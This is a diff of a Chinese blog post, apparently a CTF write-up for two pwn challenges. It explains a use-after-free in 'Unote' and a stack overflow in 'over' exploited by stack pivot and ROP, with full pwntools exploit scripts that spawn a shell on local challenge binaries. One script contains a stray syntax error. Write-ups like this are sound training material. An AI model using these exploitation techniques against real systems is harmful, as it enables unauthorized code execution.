@@ -115,11 +115,13 @@
 <meta property="og:site_name" content="foyjog">
 <meta property="og:description" content="前言感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多熟悉熟悉pwn类的题目. Unote是一个32为的程序,checksec如下:12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX en">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-07-16T10:47:35.797Z">
+<meta property="og:updated_time" content="2018-07-17T11:10:21.536Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="安恒杯第八次周周练writeup">
 <meta name="twitter:description" content="前言感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多熟悉熟悉pwn类的题目. Unote是一个32为的程序,checksec如下:12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX en">
 
+
+  
 
 
   <link rel="alternate" href="/atom.xml" title="foyjog" type="application/atom+xml" />
@@ -227,7 +229,7 @@
           
           <li class="menu-item menu-item-home">
     <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
   </li>
         
         
@@ -235,7 +237,7 @@
           
           <li class="menu-item menu-item-archives">
     <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
   </li>
 
       
@@ -321,19 +323,31 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
 
               
                 
               
 
-              <time title="Post created: 2018-07-16 18:32:37 / Updated at: 18:47:35" itemprop="dateCreated datePublished" datetime="2018-07-16T18:32:37+08:00">2018-07-16</time>
+              <time title="Created: 2018-07-16 18:32:37" itemprop="dateCreated datePublished" datetime="2018-07-16T18:32:37+08:00">2018-07-16</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-07-17 19:10:21" itemprop="dateModified" datetime="2018-07-17T19:10:21+08:00">2018-07-17</time>
               
             
           </span>
@@ -366,8 +380,8 @@
       
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多熟悉熟悉pwn类的题目.</p>
-<h1 id="Unote"><a href="#Unote" class="headerlink" title="Unote"></a>Unote</h1><p>是一个32为的程序,checksec如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure></p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多熟悉熟悉pwn类的题目.</p>
+<h3 id="Unote"><a href="#Unote" class="headerlink" title="Unote"></a>Unote</h3><p>是一个32为的程序,checksec如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure></p>
 <p>拖进ida,程序比较简单,只有四个功能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        UNote         </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;g_str_name, <span class="number">30u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      welcome();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>并不用花太多时间了解题目,认真分析分析,就能发现存在uaf的利用点.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A090 ptr             dd ?                    ; DATA XREF: add_note+3C↑r</span><br><span class="line">.bss:0804A090                                         ; add_note+5C↑w ...</span><br><span class="line">.bss:0804A094                 dd ?</span><br><span class="line">.bss:0804A098                 dd ?</span><br></pre></td></tr></table></figure></p>
@@ -382,6 +396,17 @@
 <li>调用print_note(2),即调用system(“/bin/sh”)</li>
 </ol>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./Unote"</span>)</span><br><span class="line">p = process(<span class="string">"./Unote"</span>)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#alloc note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"135168"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#alloc note2</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"135168"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#delete note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#delete note2</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#alloc note3 ,buffer 8 to note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"8"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"\x72\x86\x04\x08\x70\xa0\x04\x08"</span>)<span class="comment">#system to puts</span></span><br><span class="line"><span class="comment">#puts to system</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="over"><a href="#over" class="headerlink" title="over"></a>over</h3><p>这个题目比较少,具体代码和信息如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400676</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">80u</span>LL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">96u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>
+<p>很明显的一个栈一处,但是溢出只有16个字节,我们很可能会想到构造rop链,但是16个字节的溢出太少,所以这里利用一个技术叫做Stack Pivot,通过两次leave达到控制esp和ebp的效果.<br>思路如下:</p>
+<ol>
+<li>通过send()79个字节溢出并泄漏ebp的地址.</li>
+<li>计算ebp和buf的offset,通过stack pivot将esp设置为buf的地址.</li>
+<li>开始rop,第一次rop通过puts(puts_got)泄漏puts的libc地址,计算system和字符串/bin/sh地址.</li>
+<li>第二次rop,执行system(“/bin/sh”)</li>
+</ol>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>有点乱,将就看吧….ebp的地址设置动态调出来的,没算…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./over"</span>)</span><br><span class="line">p = process(<span class="string">"./over"</span>)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="comment">#staget 1 to leak ebppdb.set_trace()</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'A'</span>*<span class="number">79</span>)</span><br><span class="line">p.recv(<span class="number">80</span>)</span><br><span class="line">v_ebp =  u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leaked ebp :"</span>,hex(v_ebp)</span><br><span class="line"><span class="comment"># stage 2 to leak puts address</span></span><br><span class="line">p.recv()</span><br><span class="line">poprdi = p64(<span class="number">0x400793</span>)sh</span><br><span class="line">puts_gotplt = p64(<span class="number">0x601020</span>)</span><br><span class="line">puts_addr = p64(<span class="number">0x4006B9</span>)</span><br><span class="line">popret = p64(<span class="number">0x4006be</span>)</span><br><span class="line">payload2 = p64(v_ebp<span class="number">-0x50</span>)+poprdi+puts_gotplt + puts_addr+p64(v_ebp)+p64(<span class="number">0x400676</span>)+<span class="string">'A'</span>*<span class="number">32</span>+ p64(v_ebp<span class="number">-0x70</span>)+(popret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_libc_addr = u64(p.recv(<span class="number">6</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_libc_addr:"</span>,hex(puts_libc_addr)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment">#libc_2.23.so	00007FB7B4039000	00007FB7B40A8690</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">libc_puts_system_offset = <span class="number">0x7F449904E690</span> - <span class="number">0x7F4499024390</span></span><br><span class="line">libc_binsh_puts_offset = <span class="number">0x7F6B855B3D57</span> - <span class="number">0x7F6B85496690</span></span><br><span class="line">libc_binsh_address = puts_libc_addr+libc_binsh_puts_offset</span><br><span class="line">libc_system_address = puts_libc_addr - libc_puts_system_offset </span><br><span class="line">payload3 = p64(v_ebp<span class="number">-0x50</span>)+poprdi+p64(libc_binsh_address) + p64(libc_system_address)+<span class="string">'A'</span>*<span class="number">48</span>+ p64(v_ebp<span class="number">-0x98</span>)+(popret)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># system	7F4499024390</span></span><br><span class="line"><span class="comment"># puts	7F449904E690</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#binsh 00007F6B855B3D57</span></span><br><span class="line"><span class="comment">#puts	7F6B85496690</span></span><br></pre></td></tr></table></figure></p>
+
       
     </div>
 
@@ -467,10 +492,10 @@
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Inhaltsverzeichnis
+            Table of Contents
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Übersicht
+            Overview
           </li>
         </ul>
       
@@ -491,7 +516,7 @@
                   <a href="/archives/">
                 
                     <span class="site-state-item-count">19</span>
-                    <span class="site-state-item-name">Artikel</span>
+                    <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
               
@@ -551,7 +576,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unote"><span class="nav-number">2.</span> <span class="nav-text">Unote</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.0.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Unote"><span class="nav-number">1.1.</span> <span class="nav-text">Unote</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#over"><span class="nav-number">1.3.</span> <span class="nav-text">over</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -585,7 +610,7 @@
 
 
 
-  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.4.4</div>
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.4.4</div>
 
 
 
